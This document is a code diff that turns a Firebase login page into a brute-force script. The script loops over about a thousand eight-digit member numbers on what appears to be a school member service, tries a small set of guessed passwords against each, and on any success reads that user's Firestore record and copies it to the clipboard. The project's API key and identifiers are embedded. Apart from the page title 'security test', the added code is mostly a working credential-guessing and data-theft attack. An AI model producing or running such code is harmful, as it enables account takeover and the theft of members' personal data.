@@ -1,105 +1,179 @@
-<html lang="ja">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>セキュリティテスト</title>
-<style>
-body { background: linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%); font-family:sans-serif; margin:0; display:flex; justify-content:center; align-items:center; height:100vh;}
-.login-container { background:white; padding:40px; border-radius:20px; box-shadow:0 15px 35px rgba(0,0,0,0.1); width:100%; max-width:350px; text-align:center;}
-input { width:100%; padding:15px; margin-bottom:15px; border:1px solid #ddd; border-radius:10px; font-size:16px;}
-button { width:100%; padding:15px; background:#4A90E2; color:white; border:none; border-radius:10px; font-size:16px; font-weight:bold;}
-pre {text-align:left; font-size:12px; max-height:200px; overflow:auto; background:#eee; padding:10px; border-radius:10px;}
-</style>
-</head>
-
-<body>
-<div class="login-container">
-<h1>セキュリティテスト</h1>
-
-<input type="text" id="memberId" placeholder="会員番号 8桁">
-<input type="password" id="password" placeholder="パスワード">
-
-<button id="loginBtn">ログイン</button>
-
-<pre id="dump"></pre>
-<button id="downloadBtn">JSON保存</button>
-
-</div>
-
 <script type="module">
-
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-import { getFunctions, httpsCallable } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-functions.js";
+const { initializeApp, getApps } = await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js");
+const { getAuth, signInWithEmailAndPassword } = await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js");
+const { getFirestore, doc, getDoc } = await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js");
 
 const firebaseConfig = {
-apiKey:"AIzaSyAuSr-KgBjfvp-yroLH2X0tujZaUenFVsY",
-authDomain:"boxwood-spot-486909-j1.firebaseapp.com",
-projectId:"boxwood-spot-486909-j1",
-storageBucket:"boxwood-spot-486909-j1.firebasestorage.app",
-messagingSenderId:"899371812603",
-appId:"1:899371812603:web:ced1901f7a3abb5e0e125e"
+  apiKey: "AIzaSyAuSr-KgBjfvp-yroLH2X0tujZaUenFVsY",
+  authDomain: "boxwood-spot-486909-j1.firebaseapp.com",
+  projectId: "boxwood-spot-486909-j1",
 };
 
-const app = initializeApp(firebaseConfig);
+const app = getApps().length
+  ? getApps()[0]
+  : initializeApp(firebaseConfig);
+
 const auth = getAuth(app);
-const functions = getFunctions(app,"us-central1");
+const db = getFirestore(app);
 
-let lastData = null;
+// ==============================
+// 設定
+// ==============================
 
-document.getElementById("loginBtn").onclick = async () => {
+// 会員番号範囲
+const MEMBER_START = 12137741;
+const MEMBER_END   = 12138888;
 
-const inputId = document.getElementById("memberId").value.trim();
-const inputPw = document.getElementById("password").value.trim();
+// パスワード設定
+const PASS_PREFIX = "sz";
+const PASS_START  = 111111;
+const PASS_END    = 111114;
 
-if(!inputId || !inputPw){
-alert("入力してください");
-return;
+// 停止フラグ
+let running = true;
+
+// ==============================
+// ログ表示
+// ==============================
+
+function log(...args) {
+  console.log(...args);
+
+  const box = document.getElementById("log");
+
+  if (box) {
+    box.value += args.join(" ") + "\n";
+    box.scrollTop = box.scrollHeight;
+  }
 }
 
-try{
+// ==============================
+// メイン処理
+// ==============================
 
-await signInWithEmailAndPassword(
-auth,
-`${inputId}@your-school-member.com`,
-inputPw
-);
+async function run() {
 
-const checkLogin = httpsCallable(functions,"checkLogin");
-const result = await checkLogin({memberId:inputId});
+  for (let m = MEMBER_START; m <= MEMBER_END; m++) {
 
-console.log("取得データ:",result.data);
+    if (!running) {
+      log("停止");
+      return;
+    }
 
-lastData = result.data;
+    const member = String(m).padStart(8, "0");
+    const email = `${member}@your-school-member.com`;
 
-document.getElementById("dump").textContent =
-JSON.stringify(result.data,null,2);
+    for (let p = PASS_START; p <= PASS_END; p++) {
 
-}catch(e){
+      if (!running) {
+        log("停止");
+        return;
+      }
 
-console.error(e);
-alert("ログイン失敗");
+      const password = `${PASS_PREFIX}${p}`;
 
+      log(`試行 ${email} / ${password}`);
+
+      try {
+
+        // ログイン
+        const cred = await signInWithEmailAndPassword(
+          auth,
+          email,
+          password
+        );
+
+        const uid = cred.user.uid;
+
+        log("ログイン成功");
+
+        // Firestore取得
+        const memberId = localStorage.getItem("memberId") || uid;
+
+        const snap = await getDoc(
+          doc(db, "users", memberId)
+        );
+
+        if (snap.exists()) {
+
+          const data = snap.data();
+
+          log("=== JSON取得成功 ===");
+
+          const jsonText = JSON.stringify(data, null, 2);
+
+          console.log(jsonText);
+
+          // テキスト表示
+          const result = document.getElementById("result");
+
+          if (result) {
+            result.value = jsonText;
+          }
+
+          // クリップボード
+          await navigator.clipboard.writeText(jsonText);
+
+          log("クリップボードへコピー");
+
+          running = false;
+          return;
+
+        } else {
+
+          log("ドキュメントなし");
+
+        }
+
+      } catch (e) {
+
+        log("失敗:", e.message);
+
+      }
+
+    }
+
+  }
+
+  log("終了");
 }
 
+// ==============================
+// UI
+// ==============================
+
+window.startSearch = () => {
+  running = true;
+  run();
 };
 
-document.getElementById("downloadBtn").onclick = () => {
-
-if(!lastData) return;
-
-const blob = new Blob(
-[JSON.stringify(lastData,null,2)],
-{type:"application/json"}
-);
-
-const a = document.createElement("a");
-a.href = URL.createObjectURL(blob);
-a.download = "data.json";
-a.click();
-
+window.stopSearch = () => {
+  running = false;
 };
-
 </script>
-</body>
-</html>
+
+<div style="padding:20px;font-family:sans-serif">
+
+  <button onclick="startSearch()">
+    開始
+  </button>
+
+  <button onclick="stopSearch()">
+    停止
+  </button>
+
+  <h3>ログ</h3>
+
+  <textarea
+    id="log"
+    style="width:100%;height:250px"
+  ></textarea>
+
+  <h3>結果</h3>
+
+  <textarea
+    id="result"
+    style="width:100%;height:250px"
+  ></textarea>
+
+</div>
